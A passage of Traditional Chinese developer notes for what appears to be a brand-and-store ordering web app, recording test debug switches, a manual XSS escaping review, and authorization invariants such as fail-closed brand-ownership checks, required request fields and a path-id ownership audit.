- **除錯開關**：`FLOW_ONLY=關鍵字` 只跑名稱含該關鍵字的區段；`FLOW_DEBUG=1` 印出完整的 Playwright 錯誤。
- **已讀取審查、未改的**：`Brand/js/hq-specs-api.js` 的 innerHTML 模板對名稱與單價使用 `escapeHtml`；`Brand/js/hq-store-api.js` 與 `hq-specs-and-toppings-create-modals.js` 的 innerHTML 只寫入靜態字串。這是逐行讀取的結論，不是自動化檢查。

## 2026-10-24（stage 12）新增的不變量與約定

- **門市切換供應狀態只限本品牌（N-33）**：`StoreController.toggleStoreTopping`（配料）與 `AnalyticsService.toggleDrinkSupply`（飲品）以 `common/BrandReference.belongsToBrand` 檢查被切換的品項是否屬於門市所屬的品牌。分店沒有品牌、或品項沒有品牌時拒絕（fail-closed）。他品牌與不存在的 id 回同一個 404 訊息，不洩漏 id 是否存在。新增同類端點時照做，不要只查 id 存在。
- **`isAvailable` 必填**：供應切換缺少此欄位回 400，且在查詢任何資料前拒絕。原本 `null` 會在解包時拋出 NPE，變成 500。
- **懶載入的品牌只在交易內讀取**：`AnalyticsService` 沒有類別層級的交易註解，`toggleDrinkSupply` 讀取 `product.getBrand()`，所以方法自己要標 `@Transactional`。
- **授權審計的結論（2026-10-24）**：品牌端所有 path id 都在 service 以 `getBrand().getId().equals(brandId)` 檢查（分類、商品、規格、配料、分店更新）。顧客端的購物車品項（`CartService.updateItem`、`deleteItem`）、常用地址（`requireSelf` 加上 `addr.getUser()` 比對）、訂單明細、時間軸、評分與再訂購都檢查擁有者或參與者。`@RequestBody` 沒有直接綁定 JPA entity。結帳路徑（`CartService`、`OrderService`、`GroupOrderService`）檢查商品屬於門市品牌。新增 path id 端點時照同樣的寫法：先確認 path id 屬於 token 的主體，再進入方法。
- **同型 XSS 清單已過期**：`docs/REVIEW_2026-10-11.md` 的「同型未修的位置」四處（`search_result.html`、`orders.html`、`order_confirm.html`、`profile.html`）已於 2026-10-24 核實皆已 `escapeHtml`。grep 找出的其餘 `${…}` 候選多數在變數層已轉義（例如 `const name = escapeHtml(brand.name)`）。判斷是否轉義要看變數的定義，不能只看 `${` 那一行。
- **還原驗證**：`BrandReferenceTest` 的四組破壞見 README「2026-10-24 N-33 還原驗證」；兩支 Mockito 測試以 CI 驗證。
